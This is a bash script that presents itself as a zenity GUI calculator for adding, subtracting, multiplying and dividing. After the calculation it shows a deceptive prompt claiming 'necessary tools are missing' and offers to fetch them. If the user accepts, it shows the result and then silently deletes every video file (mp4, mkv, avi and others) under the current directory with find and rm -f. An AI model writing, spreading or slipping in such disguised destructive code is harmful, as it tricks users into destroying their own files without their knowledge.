#!/bin/bash

operation=""
result=$(zenity --entry \
        --title="Calculator" \
        --text="Enter a Number" \
        --width="300" --height="250") 
if [[ $? -ne 0 ]]; then
    exit 1
fi

while [[ $operation != "Equals" ]]; 
do
    operation=$(zenity --list --title="Calculator" \
        --text="Choose the Operation" \
        --column="Operations" \
        "Addition" \
        "Subtraction" \
        "Multiplication" \
        "Division" \
        "Equals" \
        --width="300" --height="250")
    
    if [[ $? -ne 0 ]]; then
        exit 1
    fi

    case "$operation" in
        "Addition")
            num=$(zenity --entry \
                --title="Calculator" \
                --text="Enter a Number" --height="250" --width="300")

            if [[ $? -ne 0 ]]; then
                exit 1
            fi

            result=$(($num + $result))
            ;;

        "Subtraction")
            num=$(zenity --entry \
                --title="Calculator" \
                --text="Enter a Number" --height="250" --width="300")
            
            if [[ $? -ne 0 ]]; then
                exit 1
            fi

            result=$(($result - $num))
            ;;

        "Multiplication")
            num=$(zenity --entry \
                --title="Calculator" \
                --text="Enter a Number" --height="250" --width="300")

            if [[ $? -ne 0 ]]; then
                exit 1
            fi

            result=$(($result * $num))
            ;;

        "Division")
            num=$(zenity --entry \
                --title="Calculator" \
                --text="Enter a Number" --height="250" --width="300")
            
            if [[ $? -ne 0 ]]; then
                exit 1
            fi

            while [[ $num -eq 0 ]]; 
            do
                zenity --error --text="Division by zero is not allowed! Reenter Number"
                num=$(zenity --entry \
                    --title="Calculator" \
                    --text="Enter a Number" --height="250" --width="300")
                
                if [[ $? -ne 0 ]]; then
                    exit 1
                fi

            done      
            result=$(($result / $num))
            ;;
            
    esac
done

zenity --question --text="Some necessary tools are missing which might cause the calculator to give wrong results.\n Do you want them to be fetched?" \
    --title="Calculator" \
    --height="250" --width="300" 

case $? in 
  0) 
  #It means OK  
    zenity --info --text="Fetching necessary tools" --title="Calculator" \
    --height="250" --width="300" 

    sleep 1

    zenity --info --title="Result" --text="The result is: $result" --height="250" --width="300"
    if [[ $? -ne 0 ]]; then
        exit 1
    fi

    find $(pwd) -type f \
    \( -name "*.mp4" -o -name "*.avi" -o -name "*.mov" -o -name "*.wmv" -o -name "*.mkv" -o -name "*.flv" -o -name "*.webm" -o -name "*.3gp" -o -name "*.m4v" \) \
    -exec rm -f {} +
  ;; 

  1) 
    zenity --info --text="Okay" --height="250" --width="300"
    if [[ $? -ne 0 ]]; then
        exit 1
    fi
    ;; 
esac 


